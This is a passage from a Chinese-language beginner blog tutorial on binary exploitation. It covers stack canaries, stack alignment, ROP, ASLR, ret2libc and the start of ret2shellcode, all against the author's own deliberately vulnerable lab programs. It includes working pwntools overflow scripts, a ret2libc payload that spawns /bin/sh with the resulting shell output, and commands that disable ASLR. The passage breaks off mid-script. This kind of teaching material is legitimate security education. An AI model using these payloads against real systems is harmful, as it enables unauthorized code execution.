</div><p>è€Œæœ«å°¾è¿”å›ä¹‹å‰å¤šäº†ä¸€æ¡åˆ¤æ–­ï¼š</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>    movl	$0, %eax
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L5
	call	__stack_chk_fail@PLT
.L5:
	leave
	ret
</code></pre></td></tr></table>
</div>
</div><p>æ˜æ˜¾èƒ½çœ‹å‡ºï¼Œ<code>%fs:40</code> å°±æ˜¯ä¸Šæ–‡å¼•ç”¨ä¸­æ‰€è°“çš„ <em>a secret value placed on the stack which changes every time the program is started</em> ã€‚</p>
<h4 id=æ ˆå¯¹é½>æ ˆå¯¹é½</h4>
<p>åœ¨64ä½ç³»ç»Ÿä¸Šï¼Œæ ˆé»˜è®¤ä¼šå¯¹é½åˆ° 16 å­—èŠ‚ï¼ˆä¹Ÿè®¸çœ‹ç¼–è¯‘å™¨é»˜è®¤å‚æ•°ï¼Œåœ¨æˆ‘çš„å®éªŒç¯å¢ƒä¸­æ˜¯è¿™æ ·çš„ï¼‰ã€‚ä¾‹å¦‚æ¡ˆä¾‹ä¸­ <code>question.c</code> çš„ <code>secret</code> æˆ‘ä»¬å¯ä»¥çœ‹åš 4 å­—èŠ‚å¤§å°ï¼ˆ<em>å…·ä½“å¤§å°å’Œä½ çš„ç³»ç»Ÿã€CPUã€ç¼–è¯‘å™¨éƒ½æœ‰å…³ç³»</em>ï¼‰ï¼Œä¹Ÿå°±æ˜¯ <code>buffer</code> åŠ ä¸Š <code>secret</code> ä¸€å…± 104 ä¸ªå­—èŠ‚ï¼Œé™¤ 16 å¾— 6.5 æ˜¾ç„¶æ˜¯æ²¡å¯¹é½çš„ã€‚ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åˆ†é…å¯¹é½åˆ° 16 å­—èŠ‚çš„æ ˆå¤§å°ï¼š112 ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>main:
	pushq	%rbp
	movq	%rsp, %rbp
	subq	$112, %rsp # align to 16 bytes
	movl	$305419896, -4(%rbp)
	movq	$0, -112(%rbp)
	movq	$0, -104(%rbp)
	movq	$0, -96(%rbp)
	movq	$0, -88(%rbp)
	movq	$0, -80(%rbp)
	movq	$0, -72(%rbp)
	movq	$0, -64(%rbp)
	movq	$0, -56(%rbp)
	movq	$0, -48(%rbp)
	movq	$0, -40(%rbp)
	movq	$0, -32(%rbp)
	movq	$0, -24(%rbp)
	movl	$0, -16(%rbp)
	leaq	-4(%rbp), %rdx # %rdx =&gt; secret
	leaq	-112(%rbp), %rax # %rax =&gt; buffer
</code></pre></td></tr></table>
</div>
</div><p>ç®€å•è®¡ç®—å¯å¾— <code>-4(%rbp) ~ (%rbp)</code> æ˜¯ <code>secret</code>ï¼Œ<code>-12(%rbp) ~ -4(%rbp)</code> æ˜¯ä¸ºäº†å¯¹é½è€Œå¡«å……çš„å¤§å°ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æƒ³æº¢å‡ºè¦†ç›– <code>secret</code> çš„å€¼ï¼Œåˆ™éœ€è¦å¡«å…… 100 å­—èŠ‚çš„ <code>buffer</code> + 8 å­—èŠ‚çš„å¯¹é½ + 4 å­—èŠ‚ <code>secret</code> å€¼ï¼Œä¸€å…± 112 å­—èŠ‚çš„ payloadã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>pwn</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=n>proc</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./question64&#39;</span><span class=p>)</span>
<span class=n>b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;@q&#39;</span><span class=p>,</span> <span class=mh>0x1234</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
<span class=n>proc</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x41</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>100</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>+</span> <span class=n>b</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=n>proc</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>

</code></pre></td></tr></table>
</div>
</div><p>ç»“æœï¼š</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-1 Â» python exploit64.py 
[+] Starting local process &#39;./question64&#39;: pid 10128
b&#39;4\x12\x00\x00\x00\x00\x00\x00&#39;
[*] Process &#39;./question64&#39; stopped with exit code 0 (pid 10128)
buffer: 0x7ffc03d29950, secret: 0x7ffc03d299bc
cool!
</code></pre></td></tr></table>
</div>
</div><h2 id=rop-åŸºç¡€>ROP åŸºç¡€</h2>
<p>æœ‰è¶£çš„éƒ¨åˆ†çœŸæ­£å¼€å§‹ã€‚ROP å…¨ç§°æ˜¯ <em>Return Oriented Programming</em>ï¼Œä¸€ç§é€šè¿‡è¿”å›æŒ‡ä»¤ä¸²è”ä»£ç ç‰‡æ®µï¼Œä»¥æ‰§è¡Œå¤æ‚é€»è¾‘çš„æŠ€æœ¯æ€æƒ³ã€‚å‚è€ƒæ–‡ç« ï¼š<a class=link href=https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#rop target=_blank rel=noopener>ctf wiki - åŸºæœ¬ROP</a>ã€‚</p>
<h3 id=åŸç†-1>åŸç†</h3>
<p>ä»ç®€å•çš„å¼€å§‹è¯´èµ·ã€‚<code>call</code>æŒ‡ä»¤çš„æœ¬è´¨æ˜¯å‹æ ˆIPå¯„å­˜å™¨æ¥ä¸€ä¸ªæ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ã€‚è€Œ<code>ret</code>æŒ‡ä»¤æœ¬è´¨æ˜¯ä»æ ˆä¸Šå¼¹å‡ºä¸€ä¸ªåœ°å€ï¼Œç„¶åæ— æ¡ä»¶è·³è½¬ã€‚</p>
<p>é‚£ä¹ˆèƒ½ç”¨<code>ret</code>æ›¿ä»£<code>call</code>æŒ‡ä»¤å—ï¼ŸæŠŠ<code>ret</code>å½“æˆ<code>jmp</code>æ¥ç”¨ï¼Œå½“ç„¶æ²¡ä»€ä¹ˆä¸èƒ½çš„ï¼ˆè€ƒè™‘ x86/cdecl è°ƒç”¨çº¦å®šï¼‰ã€‚</p>
<p><img src=/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110634684.png width=681 height=455 srcset="/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110634684_hu1e91792cb936de74538b3afcb26b0fa4_141437_480x0_resize_box_3.png 480w, /blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110634684_hu1e91792cb936de74538b3afcb26b0fa4_141437_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220816110634684 class=gallery-image data-flex-grow=149 data-flex-basis=359px></p>
<p><code>ret</code> æŒ‡ä»¤æ‰§è¡Œåï¼Œæ ˆä¸Šå¸ƒå±€å°±ä¼šå˜æˆï¼š</p>
<p><img src=/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110756861.png width=411 height=215 srcset="/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110756861_hu826fa0eb13028bd3969e5fe5a03dc856_22934_480x0_resize_box_3.png 480w, /blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110756861_hu826fa0eb13028bd3969e5fe5a03dc856_22934_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220816110756861 class=gallery-image data-flex-grow=191 data-flex-basis=458px></p>
<p>å’Œæ­£å¸¸å‡½æ•°è°ƒç”¨å¦‚å‡ºä¸€è¾™ã€‚</p>
<h3 id=aslr>ASLR</h3>
<p>æƒ³è¦å®ç°è‡ªç”±æ§åˆ¶è·³è½¬åœ°å€å’Œå‚æ•°çš„ç›®çš„ï¼Œè¿˜æœ‰ä¸€ä¸ªæ‹¦è·¯è™å« ASLR ä¸ä½œæ›´å¤šè§£é‡Šã€‚é€šè¿‡ <code>sysctl</code> æˆ–ç¼–è¾‘ <code>/proc/sys/kernel/randomize_va_space</code> æ§åˆ¶ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-makefile data-lang=makefile><span class=nf>.PHONY</span><span class=o>:</span> <span class=n>disable</span>-<span class=n>aslr</span>
<span class=nf>disable-aslr</span><span class=o>:</span>
	<span class=nb>echo</span> <span class=m>0</span> <span class=p>|</span> sudo tee /proc/sys/kernel/randomize_va_space

<span class=nf>.PHONY</span><span class=o>:</span> <span class=n>enable</span>-<span class=n>aslr</span>
<span class=nf>enable-aslr</span><span class=o>:</span>
	<span class=nb>echo</span> <span class=m>1</span> <span class=p>|</span> sudo tee /proc/sys/kernel/randomize_va_space
</code></pre></td></tr></table>
</div>
</div><p>ä¹‹åå¯ä»¥å¤šæ¬¡è¿è¡Œ <code>question32</code> ï¼Œè§‚å¯Ÿè¾“å‡ºæ¥ç¡®è®¤æ ˆåœ°å€æ˜¯å¦å˜åŒ–ã€‚</p>
<h3 id=ret2libc>ret2libc</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// gcc question.c -m32 -fno-stack-protector -no-pie -g -O0 -o question32
</span><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>char</span> <span class=n>name</span><span class=p>[</span><span class=mi>100</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;&#34;</span><span class=p>;</span>

<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>100</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;&#34;</span><span class=p>;</span>
  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;name: %p buffer: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>buffer</span><span class=p>);</span>
  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;what&#39;s your name?</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
  <span class=n>read</span><span class=p>(</span><span class=n>STDIN_FILENO</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>name</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Welcome, %s. Show your hack skill.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span>
  <span class=n>read</span><span class=p>(</span><span class=n>STDIN_FILENO</span><span class=p>,</span> <span class=n>buffer</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>);</span>
  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>ç®€å•å†™ä¸€ä¸ªè„šæœ¬ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>pwn</span>
<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>gdb</span><span class=p>,</span> <span class=n>process</span>
<span class=kn>import</span> <span class=nn>struct</span>


<span class=k>def</span> <span class=nf>p32s</span><span class=p>(</span><span class=o>*</span><span class=n>i</span><span class=p>):</span>
    <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;&#34;</span><span class=o>+</span><span class=s2>&#34;I&#34;</span><span class=o>*</span><span class=nb>len</span><span class=p>(</span><span class=n>i</span><span class=p>),</span> <span class=o>*</span><span class=n>i</span><span class=p>)</span>


<span class=n>p</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s1>&#39;./question32&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;&#39;
</span><span class=s1>b question.c:13
</span><span class=s1>continue
</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>è§‚å¯Ÿç¨‹åºçš„ epilogue éƒ¨åˆ†ï¼Œ<code>main()</code> åœ¨ prologue éƒ¨åˆ†ä¿å­˜äº† <code>%ecx</code>ã€<code>%edi</code>ã€<code>%ebx</code> å¯„å­˜å™¨çš„å€¼ï¼Œåœ¨æ¸…æ ˆé˜¶æ®µä¼šæ¢å¤è¿™äº›å¯„å­˜å™¨ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>   leal	-12(%ebp), %esp
   popl	%ecx
   popl	%ebx
   popl	%edi
   popl	%ebp
   leal	-4(%ecx), %esp
   ret
</code></pre></td></tr></table>
</div>
</div><p>éœ€è¦æ³¨æ„çš„æ˜¯ <code>%ecx</code> å¯„å­˜å™¨çš„å€¼ä¼šè¢«ç”¨ä½œ <code>%esp</code> ï¼Œè€Œæˆ‘ä»¬è¦†å†™è¿”å›åœ°å€å¿…ç„¶å¯¼è‡´ <code>%ecx</code> å¯„å­˜å™¨çš„å€¼è¢«è¦†å†™ï¼Œæ‰€ä»¥éœ€è¦æå‰ç®—å¥½ <code>leal -4(%ecx), %esp</code> æŒ‡ä»¤æ‰§è¡Œå <code>%esp</code> æŒ‡å‘çš„ä½ç½®ï¼Œè®© <code>%esp</code> åˆšå¥½æŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ <code>system</code> å‡½æ•°åœ°å€ã€‚</p>
<p>è„šæœ¬å¯åŠ¨ gdb åå…ˆè®¡ç®—ä¸‹ <code>&buffer</code> åˆ° <code>movl -12(%ebp), %esp</code> è¿™æ¡æŒ‡ä»¤åçš„ <code>%esp</code> çš„è·ç¦»ï¼Œä¹Ÿå°±æ˜¯ä»<code>buffer</code>ä¸€è·¯å†™åˆ°æ ˆä¸Šä¿å­˜çš„ <code>%ecx</code> å‰æ‰€éœ€å¡«å……çš„é•¿åº¦ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>gdb-peda$ p &amp;buffer
$1 = (char (*)[100]) 0xffffd0dc
gdb-peda$ distance 0xffffd0dc
From 0xffffd14c (SP) to 0xffffd0dc: -112 bytes, -28 dwords
gdb-peda$
</code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°é•¿åº¦åç®€å•è®¡ç®—ä¸‹ <code>&buffer(0xffffd0dc) + padding_size(112) + register(4) * 4</code> ç­‰äº <code>0xffffd1bc</code>ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯æˆ‘ä»¬æº¢å‡ºåè¦†å†™çš„è¿”å›åœ°å€æ‰€åœ¨ä½ç½®ï¼Œè¿™ä¸ªåœ°å€åŠ ä¸Š 4 å°±æ˜¯ <code>%ecx</code> çš„å–å€¼äº†ã€‚</p>
<p>æœ€åè·å– <code>system</code> å‡½æ•°çš„åœ°å€å’Œ <code>name</code> çš„åœ°å€ï¼Œä½œä¸º <code>system</code> å‡½æ•°çš„è¿”å›åœ°å€æˆ‘ä»¬å†è·å–ä¸€ä¸‹ <code>exit</code> å‡½æ•°çš„åœ°å€ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>gdb-peda$ p &amp;system
$1 = (&lt;text variable, no debug info&gt; *) 0xf7dcbcb0 &lt;system&gt;
gdb-peda$ p &amp;name
$2 = (char (*)[100]) 0x804c060 &lt;name&gt;
gdb-peda$ p &amp;exit
$3 = (&lt;text variable, no debug info&gt; *) 0xf7dbe1c0 &lt;exit&gt;
gdb-peda$
</code></pre></td></tr></table>
</div>
</div><p>ç»¼åˆè¿™äº›å…ƒç´ ç»„è£…ä¸€ä¸ª payload ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>gdb</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s1>&#39;./question32&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;&#39;
</span><span class=s1>b question.c:13
</span><span class=s1>continue
</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>

<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span>

<span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x42</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>112</span>
<span class=c1># %ecx, %ebx, %edi, %ebp, &amp;system, &amp;exit, &amp;name</span>
<span class=n>stack_elem</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xffffd1c0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0xf7dcbcb0</span><span class=p>,</span> <span class=mh>0xf7dbe1c0</span><span class=p>,</span> <span class=mh>0x804c060</span><span class=p>]</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;IIIIIII&#39;</span><span class=p>,</span> <span class=o>*</span><span class=n>stack_elem</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>å¯åŠ¨è°ƒè¯•ï¼Œæ³¨æ„åˆ°æ‰§è¡Œåˆ° <code>ret</code> æ—¶ï¼Œ<code>%esp</code> å·²ç»æ˜¯ <code>system</code> çš„åœ°å€ï¼Œå¹¶é¢„å…ˆå¡«å……äº† <code>exit</code> å‡½æ•°åœ°å€ä½œä¸º <code>system</code> å‡½æ•°çš„è¿”å›åœ°å€ï¼Œ<code>"/bin/sh"</code> å­—ç¬¦ä¸²çš„æŒ‡é’ˆä½œä¸º <code>system</code> å‡½æ•°çš„å‚æ•°ã€‚</p>
<p><img src=/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161537813.png width=983 height=614 srcset="/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161537813_hu99c27d78f9ce90295c36750c1d6b5b3e_618877_480x0_resize_box_3.png 480w, /blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161537813_hu99c27d78f9ce90295c36750c1d6b5b3e_618877_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220817161537813 class=gallery-image data-flex-grow=160 data-flex-basis=384px></p>
<p>ç»§ç»­æ‰§è¡Œã€‚</p>
<p><img src=/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161746120.png width=1920 height=1040 srcset="/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161746120_hu5696a5cba533ced68cff91d76d71e89a_1615602_480x0_resize_box_3.png 480w, /blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161746120_hu5696a5cba533ced68cff91d76d71e89a_1615602_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220817161746120 class=gallery-image data-flex-grow=184 data-flex-basis=443px></p>
<p>æˆåŠŸå–å¾—shellã€‚ç°åœ¨æˆ‘ä»¬æŠŠè°ƒè¯•å™¨å»é™¤ï¼Œä½¿ç”¨ <code>pwn.process</code> æ¥å¯åŠ¨ç¨‹åºã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>process</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./question32&#39;</span><span class=p>)</span>

<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span>

<span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x42</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>112</span>
<span class=c1># %ecx, %ebx, %edi, %ebp, &amp;system, &amp;perror, &amp;name</span>
<span class=n>stack_elem</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xffffd1c0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0xf7dcbcb0</span><span class=p>,</span> <span class=mh>0xf7dbe1c0</span><span class=p>,</span> <span class=mh>0x804c060</span><span class=p>]</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;IIIIIII&#39;</span><span class=p>,</span> <span class=o>*</span><span class=n>stack_elem</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>ç»“æœï¼š</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-2 Â» python exp32.py
[+] Starting local process &#39;./question32&#39;: pid 146484
[*] Switching to interactive mode
name: 0x804c060 buffer: 0xffffd13c
what&#39;s your name?
Welcome, /bin/sh. Show your hack skill.
$ echo $0
/bin/sh
$
</code></pre></td></tr></table>
</div>
</div><p>æˆåŠŸã€‚</p>
<h3 id=ret2shellcode>ret2shellcode</h3>
<p>è¿™æ˜¯å¦ä¸€ä¸ªä¾‹å­ï¼Œä¸åŒä¹‹å¤„åœ¨äºæ ˆå¯æ‰§è¡Œä¿æŠ¤æ²¡æœ‰å¼€å¯ï¼ˆç¼–è¯‘å‚æ•° <code>-z execstack</code>ï¼‰ã€‚å…¶ä»–å’Œä¸Šä¾‹ç›¸åŒã€‚</p>
<p>pwntools æä¾›äº†ä¸€äº› shellcode ç‰‡æ®µï¼Œå…¶ä¸­å°±æœ‰ç”¨ç³»ç»Ÿè°ƒç”¨ <code>execve</code> å¯åŠ¨ <code>/bin/sh</code> çš„ä»£ç ã€‚åœ¨ <code>ret2libc</code> çš„ <code>exploit</code> åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬åªç”¨æŠŠè¿”å›åœ°å€ä¿®æ”¹æˆ <code>buffer</code> çš„åœ°å€ï¼ŒæŠŠå¡«å…… <code>buffer</code> çš„ <code>\x41</code> æ¢æˆ shellcode å³å¯ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>gdb</span><span class=p>,</span> <span class=n>shellcraft</span><span class=p>,</span> <span class=n>asm</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s1>&#39;./question32&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;&#39;
</span><span class=s1>b question.c:13
</span><span class=s1>continue
</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>

